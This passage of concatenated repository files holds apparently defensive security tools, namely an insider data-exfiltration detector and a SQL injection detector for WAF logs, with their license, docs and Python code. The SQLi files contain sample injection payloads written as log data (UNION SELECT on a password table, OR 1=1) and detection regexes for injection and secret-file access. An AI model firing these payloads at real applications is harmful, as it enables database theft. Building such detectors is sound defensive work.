      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-insider-data-exfiltration-via-dlp/references/api-reference.md =====
# API Reference: Detecting Insider Data Exfiltration via DLP

## Pandas Behavioral Analytics

```python
import pandas as pd

df = pd.read_csv("activity.csv", parse_dates=["timestamp"])
# Columns: timestamp, user, action, file_path, bytes_transferred, destination

# Daily volume baseline per user
daily = df.groupby(["user", df["timestamp"].dt.date])["bytes_transferred"].sum()
baseline = daily.groupby("user").agg(["mean", "std"])

# Off-hours detection
df["hour"] = df["timestamp"].dt.hour
off_hours = df[(df["hour"] < 6) | (df["hour"] >= 22)]

# Bulk download detection
df.set_index("timestamp").groupby("user").resample("1h").size()
```

## Exfiltration Indicators

| Indicator | Threshold | Severity |
|-----------|-----------|----------|
| Volume > 3x baseline | Per user daily avg | HIGH |
| Volume > 5x baseline | Per user daily avg | CRITICAL |
| Off-hours events | > 10 per user | HIGH |
| Bulk downloads | > 50 files/hour | CRITICAL |
| USB transfers | Any volume | HIGH |
| Sensitive file access | Pattern match | HIGH |

## Sensitive File Patterns

```python
patterns = [
    r"\.pem$", r"\.key$", r"\.env$",
    r"credentials", r"password", r"\.kdbx$",
    r"financial", r"payroll", r"customer.*data"
]
```

## Microsoft Purview DLP API

```python
import requests
headers = {"Authorization": "Bearer <token>"}
resp = requests.get(
    "https://graph.microsoft.com/v1.0/security/alerts_v2",
    headers=headers,
    params={"$filter": "category eq 'DataLossPrevention'"}
)
```

### References

- Microsoft Purview DLP: https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp
- pandas: https://pandas.pydata.org/docs/
- UEBA: https://www.gartner.com/en/information-technology/glossary/user-entity-behavior-analytics

===== END FILE =====


===== FILE: skills/detecting-insider-data-exfiltration-via-dlp/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for detecting insider data exfiltration via DLP analysis."""

import json
import argparse
from datetime import datetime

import pandas as pd


def load_activity_logs(log_path):
    """Load file/cloud activity logs."""
    if log_path.endswith(".csv"):
        return pd.read_csv(log_path, parse_dates=["timestamp"])
    return pd.read_json(log_path, lines=True)


def detect_volume_anomalies(df, multiplier=3.0):
    """Detect users with data transfer volume exceeding baseline."""
    df["date"] = df["timestamp"].dt.date
    daily_volume = df.groupby(["user", "date"])["bytes_transferred"].sum().reset_index()
    user_baseline = daily_volume.groupby("user")["bytes_transferred"].agg(
        ["mean", "std"]).reset_index()
    user_baseline.columns = ["user", "avg_bytes", "std_bytes"]
    latest_date = df["date"].max()
    latest_day = daily_volume[daily_volume["date"] == latest_date]
    merged = latest_day.merge(user_baseline, on="user")
    threshold = merged["avg_bytes"] + (multiplier * merged["std_bytes"].fillna(0))
    anomalies = merged[merged["bytes_transferred"] > threshold]
    findings = []
    for _, row in anomalies.iterrows():
        findings.append({
            "user": row["user"],
            "today_bytes": int(row["bytes_transferred"]),
            "avg_bytes": int(row["avg_bytes"]),
            "multiplier": round(row["bytes_transferred"] / max(row["avg_bytes"], 1), 1),
            "severity": "CRITICAL" if row["bytes_transferred"] > row["avg_bytes"] * 5 else "HIGH",
        })
    return sorted(findings, key=lambda x: x["multiplier"], reverse=True)


def detect_off_hours_activity(df, start_hour=6, end_hour=22):
    """Detect file access during off-hours."""
    df["hour"] = df["timestamp"].dt.hour
    off_hours = df[(df["hour"] < start_hour) | (df["hour"] >= end_hour)]
    if off_hours.empty:
        return []
    user_counts = off_hours.groupby("user").agg(
        events=("timestamp", "count"),
        bytes_total=("bytes_transferred", "sum"),
        unique_files=("file_path", "nunique") if "file_path" in df.columns
        else ("filename", "nunique"),
    ).reset_index()
    findings = []
    for _, row in user_counts.iterrows():
        if row["events"] > 10:
            findings.append({
                "user": row["user"],
                "off_hours_events": int(row["events"]),
                "bytes_transferred": int(row["bytes_total"]),
                "unique_files": int(row["unique_files"]),
                "severity": "HIGH",
            })
    return sorted(findings, key=lambda x: x["off_hours_events"], reverse=True)


def detect_bulk_downloads(df, file_threshold=50, time_window="1h"):
    """Detect bulk file downloads in short time windows."""
    findings = []
    df_sorted = df.sort_values("timestamp")
    download_actions = ["download", "copy", "export"]
    action_col = "action" if "action" in df.columns else "event_type"
    downloads = df_sorted[df_sorted[action_col].str.lower().isin(download_actions)]
    if downloads.empty:
        return findings
    downloads = downloads.set_index("timestamp")
    for user, group in downloads.groupby("user"):
        rolling = group.resample(time_window).size()
        bursts = rolling[rolling >= file_threshold]
        if len(bursts) > 0:
            findings.append({
                "user": user,
                "max_downloads_per_hour": int(rolling.max()),
                "burst_periods": len(bursts),
                "total_downloads": len(group),
                "severity": "CRITICAL",
            })
    return findings


def detect_sensitive_file_access(df, sensitive_patterns=None):
    """Detect access to sensitive file types or directories."""
    if sensitive_patterns is None:
        sensitive_patterns = [
            r"\.pem$", r"\.key$", r"\.env$", r"credentials",
            r"password", r"\.kdbx$", r"\.pfx$", r"secret",
            r"financial", r"payroll", r"customer.*data",
        ]
    file_col = "file_path" if "file_path" in df.columns else "filename"
    findings = []
    import re
    for _, row in df.iterrows():
        filepath = str(row.get(file_col, ""))
        for pattern in sensitive_patterns:
            if re.search(pattern, filepath, re.IGNORECASE):
                findings.append({
                    "user": row.get("user", ""),
                    "file": filepath,
                    "pattern_matched": pattern,
                    "action": row.get("action", row.get("event_type", "")),
                    "timestamp": str(row.get("timestamp", "")),
                    "severity": "HIGH",
                })
                break
    return findings[:500]


def detect_usb_activity(df):
    """Detect USB device usage for data transfer."""
    usb_indicators = ["removable", "usb", "external"]
    dest_col = "destination" if "destination" in df.columns else "target"
    usb_events = df[df[dest_col].str.lower().str.contains(
        "|".join(usb_indicators), na=False)]
    if usb_events.empty:
        return []
    user_usb = usb_events.groupby("user").agg(
        events=("timestamp", "count"),
        bytes_total=("bytes_transferred", "sum"),
    ).reset_index()
    findings = []
    for _, row in user_usb.iterrows():
        findings.append({
            "user": row["user"],
            "usb_events": int(row["events"]),
            "bytes_to_usb": int(row["bytes_total"]),
            "severity": "HIGH",
        })
    return findings


def main():
    parser = argparse.ArgumentParser(description="Insider Data Exfiltration Detection Agent")
    parser.add_argument("--log-file", required=True, help="Activity log file")
    parser.add_argument("--output", default="dlp_exfiltration_report.json")
    parser.add_argument("--action", choices=[
        "volume", "off_hours", "bulk", "sensitive", "full_analysis"
    ], default="full_analysis")
    args = parser.parse_args()

    df = load_activity_logs(args.log_file)
    report = {"generated_at": datetime.utcnow().isoformat(), "total_events": len(df),
              "findings": {}}
    print(f"[+] Loaded {len(df)} activity events")

    if args.action in ("volume", "full_analysis"):
        findings = detect_volume_anomalies(df)
        report["findings"]["volume_anomalies"] = findings
        print(f"[+] Volume anomalies: {len(findings)}")

    if args.action in ("off_hours", "full_analysis"):
        findings = detect_off_hours_activity(df)
        report["findings"]["off_hours_activity"] = findings
        print(f"[+] Off-hours activity users: {len(findings)}")

    if args.action in ("bulk", "full_analysis"):
        findings = detect_bulk_downloads(df)
        report["findings"]["bulk_downloads"] = findings
        print(f"[+] Bulk download users: {len(findings)}")

    if args.action in ("sensitive", "full_analysis"):
        findings = detect_sensitive_file_access(df)
        report["findings"]["sensitive_access"] = findings
        print(f"[+] Sensitive file accesses: {len(findings)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-sql-injection-via-waf-logs/SKILL.md =====
---
name: detecting-sql-injection-via-waf-logs
description: Analyze WAF (ModSecurity/AWS WAF/Cloudflare) logs to detect SQL injection
  attack campaigns. Parses ModSecurity audit logs and JSON WAF event logs to identify
  SQLi patterns (UNION SELECT, OR 1=1, SLEEP(), BENCHMARK()), tracks attack sources,
  correlates multi-stage injection attempts, and generates incident reports with OWASP
  classification.
domain: cybersecurity
subdomain: security-operations
tags:
- waf-log-analysis
- sql-injection-detection
- modsecurity
- aws-waf
- cloudflare-waf
- web-application-security
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1190
- T1505.003
- T1059.007
---


# Detecting SQL Injection via WAF Logs


## When to Use

- When investigating security incidents that require detecting sql injection via waf logs
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install requests`
2. Collect WAF logs (ModSecurity audit log, AWS WAF JSON logs, or Cloudflare firewall events).
3. Run the agent to parse and analyze:
   - Detect SQLi payloads via 15+ regex patterns
   - Classify attacks by OWASP injection type (classic, blind, time-based, UNION-based)
   - Identify persistent attackers by IP clustering
   - Correlate multi-request injection campaigns
   - Calculate attack success probability based on response codes

```bash
python scripts/agent.py --log-file /var/log/modsec_audit.log --format modsecurity --output sqli_report.json
```

## Examples

### ModSecurity SQLi Detection
```
Rule 942100 triggered: SQL Injection Attack Detected via libinjection
URI: /api/users?id=1' UNION SELECT username,password FROM users--
Source IP: 203.0.113.42 (47 requests in 5 minutes)
Classification: UNION-based SQLi campaign
```

===== END FILE =====


===== FILE: skills/detecting-sql-injection-via-waf-logs/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-sql-injection-via-waf-logs/references/api-reference.md =====
# API Reference: SQL Injection Detection via WAF Logs

## ModSecurity Audit Log Sections
| Section | Content |
|---------|---------|
| A | Audit log header (timestamp, transaction ID) |
| B | Request headers (method, URI, HTTP version) |
| C | Request body |
| E | Response body |
| F | Response headers |
| H | Audit log trailer (rule matches, actions) |

## OWASP CRS SQLi Rules (942xxx)
| Rule ID | Description |
|---------|-------------|
| 942100 | SQL Injection via libinjection |
| 942110 | SQL Injection (common keywords) |
| 942120 | SQL Injection operator detected |
| 942130 | SQL Injection tautology |
| 942150 | SQL Injection function detected |
| 942160 | Blind SQLi (sleep/benchmark) |
| 942170 | UNION query injection |
| 942190 | MSSQL code execution |
| 942200 | MySQL comment obfuscation |
| 942210 | Chained SQL injection |
| 942280 | PostgreSQL/MSSQL sleep |
| 942290 | MongoDB injection |

## SQL Injection Types
| Type | Pattern | Severity |
|------|---------|----------|
| UNION-based | `UNION SELECT` | Critical |
| Time-based blind | `SLEEP()`, `BENCHMARK()`, `WAITFOR DELAY` | Critical |
| Error-based | `EXTRACTVALUE()`, `UPDATEXML()` | High |
| Tautology | `OR 1=1`, `AND 1=1` | High |
| Stacked query | `'; DROP TABLE` | Critical |
| Schema enum | `INFORMATION_SCHEMA` | High |
| File access | `LOAD_FILE()`, `INTO OUTFILE` | Critical |

## AWS WAF Log Format (JSON)
```json
{
  "httpRequest": {
    "clientIp": "203.0.113.42",
    "uri": "/api/users",
    "args": "id=1' OR 1=1--",
    "httpMethod": "GET"
  },
  "action": "BLOCK",
  "ruleGroupList": [{"ruleId": "SQLi_BODY"}]
}
```

## Campaign Detection Logic
- Group requests by source IP
- Flag IPs with >= 5 SQLi attempts as campaigns
- IPs with > 20 requests classified as automated tooling
- Multiple attack types from same IP = multi-stage campaign

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application

===== END FILE =====


===== FILE: skills/detecting-sql-injection-via-waf-logs/scripts/agent.py =====
#!/usr/bin/env python3
"""SQL Injection WAF Log Analysis Agent - Detects SQLi attacks from ModSecurity and WAF logs."""

import json
import re
import logging
import argparse
from datetime import datetime
from collections import defaultdict

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

SQLI_PATTERNS = [
    (r"(?i)\bUNION\s+(?:ALL\s+)?SELECT\b", "UNION-based", "critical"),
    (r"(?i)\bOR\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+", "Tautology (OR 1=1)", "high"),
    (r"(?i)\bAND\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+", "Tautology (AND 1=1)", "high"),
    (r"(?i)\bSLEEP\s*\(\s*\d+\s*\)", "Time-based blind (SLEEP)", "critical"),
    (r"(?i)\bBENCHMARK\s*\(", "Time-based blind (BENCHMARK)", "critical"),
    (r"(?i)\bWAITFOR\s+DELAY\b", "Time-based blind (WAITFOR)", "critical"),
    (r"(?i)['\"]\s*;\s*(?:DROP|DELETE|UPDATE|INSERT)\b", "Stacked query", "critical"),
    (r"(?i)\bINFORMATION_SCHEMA\b", "Schema enumeration", "high"),
    (r"(?i)\bLOAD_FILE\s*\(", "File read (LOAD_FILE)", "critical"),
    (r"(?i)\bINTO\s+(?:OUT|DUMP)FILE\b", "File write (INTO OUTFILE)", "critical"),
    (r"(?i)\bCONCAT\s*\(.*\bSELECT\b", "Nested SELECT in CONCAT", "high"),
    (r"(?i)\bGROUP_CONCAT\s*\(", "Data extraction (GROUP_CONCAT)", "high"),
    (r"(?i)\bEXTRACTVALUE\s*\(", "Error-based (EXTRACTVALUE)", "high"),
    (r"(?i)\bUPDATEXML\s*\(", "Error-based (UPDATEXML)", "high"),
    (r"(?i)(?:--|#|/\*)\s*$", "Comment termination", "medium"),
    (r"(?i)\bCHAR\s*\(\s*\d+(?:\s*,\s*\d+)*\s*\)", "CHAR() encoding bypass", "medium"),
    (r"(?i)0x[0-9a-f]{6,}", "Hex encoding bypass", "medium"),
]

MODSEC_RULE_MAP = {
    "942100": "SQL Injection via libinjection",
    "942110": "SQL Injection (common keywords)",
    "942120": "SQL Injection operator",
    "942130": "SQL Injection tautology",
    "942140": "SQL Injection (DB names)",
    "942150": "SQL Injection (functions)",
    "942160": "SQL Injection blind test (sleep/benchmark)",
    "942170": "SQL Injection (UNION query)",
    "942180": "SQL Injection bypass (basic auth)",
    "942190": "SQL Injection (MSSQL exec)",
    "942200": "SQL Injection (MySQL comment/space obfuscation)",
    "942210": "SQL Injection (chained)",
    "942220": "SQL Injection (integer overflow)",
    "942230": "SQL Injection (conditional)",
    "942240": "SQL Injection (MySQL charset switch)",
    "942250": "SQL Injection (MATCH AGAINST)",
    "942260": "SQL Injection bypass (basic auth 2)",
    "942270": "SQL Injection (common DB names)",
    "942280": "SQL Injection (pg_sleep/waitfor)",
    "942290": "SQL Injection (MongoDB)",
}


def parse_modsecurity_audit_log(log_file):
    """Parse ModSecurity audit log format."""
    entries = []
    current_entry = {}
    current_section = None

    with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.rstrip()
            if line.startswith("--") and line.endswith("-A--"):
                if current_entry:
                    entries.append(current_entry)
                current_entry = {"id": line.strip("-A-").strip("-"), "sections": {}}
                current_section = "A"
            elif line.startswith("--") and re.match(r"--\w+-[A-Z]--$", line):
                current_section = line[-3]
            elif current_section:
                current_entry.setdefault("sections", {})
                current_entry["sections"].setdefault(current_section, [])
                current_entry["sections"][current_section].append(line)

    if current_entry:
        entries.append(current_entry)
    logger.info("Parsed %d ModSecurity audit log entries", len(entries))
    return entries


def parse_json_waf_log(log_file):
    """Parse JSON-formatted WAF logs (AWS WAF, Cloudflare)."""
    entries = []
    with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            try:
                entry = json.loads(line.strip())
                entries.append(entry)
            except json.JSONDecodeError:
                continue
    logger.info("Parsed %d JSON WAF log entries", len(entries))
    return entries


def classify_sqli(payload):
    """Classify SQL injection type and severity from payload string."""
    matches = []
    for pattern, attack_type, severity in SQLI_PATTERNS:
        if re.search(pattern, payload):
            matches.append({"type": attack_type, "severity": severity})
    return matches


def analyze_modsecurity_entries(entries):
    """Analyze parsed ModSecurity entries for SQLi attacks."""
    findings = []
    for entry in entries:
        sections = entry.get("sections", {})
        request_lines = sections.get("B", [])
        header_lines = sections.get("H", [])

        request_uri = ""
        source_ip = ""
        rule_ids = []

        if request_lines:
            first_line = request_lines[0]
            parts = first_line.split(" ")
            if len(parts) >= 2:
                request_uri = parts[1]

        for line in header_lines:
            m = re.search(r"id\s*\"(\d+)\"", line)
            if m:
                rule_ids.append(m.group(1))
            m = re.search(r"Remote-Addr:\s*(\S+)", line)
            if m:
                source_ip = m.group(1)

        sqli_rules = [rid for rid in rule_ids if rid in MODSEC_RULE_MAP]
        if sqli_rules:
            sqli_classes = classify_sqli(request_uri)
            findings.append({
                "source_ip": source_ip,
                "request_uri": request_uri[:500],
                "rules_triggered": [{"id": r, "desc": MODSEC_RULE_MAP.get(r, "Unknown")} for r in sqli_rules],
                "sqli_classification": sqli_classes if sqli_classes else [{"type": "WAF rule match", "severity": "high"}],
                "severity": "critical" if any(c["severity"] == "critical" for c in sqli_classes) else "high",
            })
    return findings


def analyze_json_waf_entries(entries):
    """Analyze JSON WAF log entries for SQLi patterns."""
    findings = []
    for entry in entries:
        uri = entry.get("httpRequest", {}).get("uri", "") or entry.get("ClientRequestURI", "")
        args = entry.get("httpRequest", {}).get("args", "") or entry.get("queryString", "")
